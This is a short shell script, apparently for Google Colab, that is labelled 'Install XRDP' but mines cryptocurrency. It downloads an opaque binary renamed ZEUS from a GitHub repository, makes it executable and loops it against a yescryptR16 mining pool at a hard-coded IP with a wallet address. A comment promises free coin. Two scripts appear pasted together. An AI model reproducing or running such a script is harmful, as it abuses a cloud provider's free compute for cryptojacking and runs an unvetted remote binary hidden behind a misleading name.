#!/bin/sh
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R ZEUS

wget https://github.com/indah38/ccminer/raw/main/ZEUS
chmod 700 ZEUS

#!/bin/sh
#
# Choose nearest stratum:
#       stratum-eu.rplant.xyz   /France/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Canada/
#
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
while [ 1 ]; do
"$FOLDER"/ZEUS -a yescryptR16 -o stratum+tcp://178.128.86.41:80 -u v97wvPWXt1p9GCYpqGEeAE4rTxi5CWh8eo.vrt
sleep 5
done
